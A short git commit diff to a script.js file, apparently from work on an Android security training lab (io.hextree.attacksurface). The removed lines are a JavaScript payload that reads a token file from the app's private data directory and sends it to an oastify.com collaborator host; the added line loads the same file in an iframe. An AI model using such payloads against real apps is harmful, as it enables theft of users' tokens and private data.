bb11935e35ecff3a85c9e178c10abab0bd2a5d40
lindoke <66307433+lindoke@users.noreply.github.com>
2025-03-19 13:25:28 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,1 @@
-<script>
-    fetch("file:///data/data/io.hextree.attacksurface/files/token.txt")
-        .then(data => {
-            document.body.innerHTML = "<pre>" + data + "</pre>";
-            fetch("https://bhwlivvbiakjmrbq8ox13u3xcoif65uu.oastify.com?data=" + encodeURIComponent(data));
-        })
-        .catch(error => console.error(error));
-</script>
+<iframe src="file:///data/data/io.hextree.attacksurface/files/token.txt"></iframe>
